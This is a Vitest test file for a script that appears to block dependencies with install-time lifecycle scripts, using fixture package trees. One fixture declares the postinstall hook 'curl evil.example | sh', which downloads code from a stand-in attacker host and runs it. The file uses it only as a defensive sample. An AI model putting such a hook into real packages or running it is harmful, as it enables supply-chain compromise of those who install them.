import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'

// The supply chain gate (SECURITY.org T5) is a script, so its test drives the
// script over a fixture tree instead of the repository's own node_modules.
const script = join(import.meta.dirname, '../../scripts/check-deps.mjs')

let modules: string

function installed(name: string, scripts?: Record<string, string>) {
  const directory = join(modules, name)
  mkdirSync(directory, { recursive: true })
  writeFileSync(
    join(directory, 'package.json'),
    JSON.stringify({ name, version: '1.0.0', scripts }),
  )
  return directory
}

function check(target = modules) {
  return spawnSync(process.execPath, [script, target], { encoding: 'utf8' })
}

beforeEach(() => {
  modules = join(mkdtempSync(join(tmpdir(), 'nemesis-check-deps-')), 'node_modules')
  mkdirSync(modules, { recursive: true })
})

afterEach(() => {
  rmSync(join(modules, '..'), { recursive: true, force: true })
})

describe('check-deps (SECURITY.org T5)', () => {
  it('passes on a tree with no lifecycle scripts', () => {
    installed('quiet-package')
    const result = check()
    expect(result.status).toBe(0)
  })

  it('fails and names every package that runs code at install time', () => {
    installed('sneaky', { postinstall: 'curl evil.example | sh' })
    installed('@scope/builder', { install: 'node-gyp rebuild' })
    installed('early', { preinstall: 'echo hi' })
    const result = check()
    expect(result.status).toBe(1)
    expect(result.stderr).toContain('sneaky')
    expect(result.stderr).toContain('@scope/builder')
    expect(result.stderr).toContain('early')
  })

  it('allows electron, which downloads its own binary', () => {
    installed('electron', { postinstall: 'node install.js' })
    const result = check()
    expect(result.status).toBe(0)
  })

  it('looks inside nested node_modules', () => {
    const parent = installed('parent')
    const nested = join(parent, 'node_modules', 'deep')
    mkdirSync(nested, { recursive: true })
    writeFileSync(
      join(nested, 'package.json'),
      JSON.stringify({ name: 'deep', scripts: { postinstall: 'echo hi' } }),
    )
    const result = check()
    expect(result.status).toBe(1)
    expect(result.stderr).toContain('deep')
  })

  it('fails with an install instruction when the tree is absent', () => {
    const result = check(join(modules, 'does-not-exist'))
    expect(result.status).toBe(1)
    expect(result.stderr).toContain('npm ci --ignore-scripts')
  })
})
